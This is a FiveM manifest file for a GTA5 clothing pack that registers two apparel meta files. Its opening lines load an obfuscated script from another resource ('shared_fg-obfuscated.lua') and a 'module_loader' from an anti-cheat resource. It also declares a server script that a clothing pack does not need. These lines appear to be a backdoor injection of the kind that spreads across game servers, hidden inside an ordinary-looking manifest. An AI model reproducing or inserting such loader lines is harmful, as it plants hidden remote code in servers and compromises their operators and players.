shared_script '@esx_society/shared_fg-obfuscated.lua'
shared_script '@FIREAC/xero_module_loader.lua'
-- Generated with AltTool

fx_version 'bodacious'
game { 'gta5' }

name "mrdm_cloth"
description "MoonRise DM Clothing Pack"
author "DAN1/ZSOMBOR"
version "1.0"

files {
  'mp_m_freemode_01_mp_m_mrdm.meta',
  'mp_f_freemode_01_mp_f_mrdm.meta'
}

data_file 'SHOP_PED_APPAREL_META_FILE' 'mp_m_freemode_01_mp_m_mrdm.meta'
data_file 'SHOP_PED_APPAREL_META_FILE' 'mp_f_freemode_01_mp_f_mrdm.meta'

server_script 'main.lua'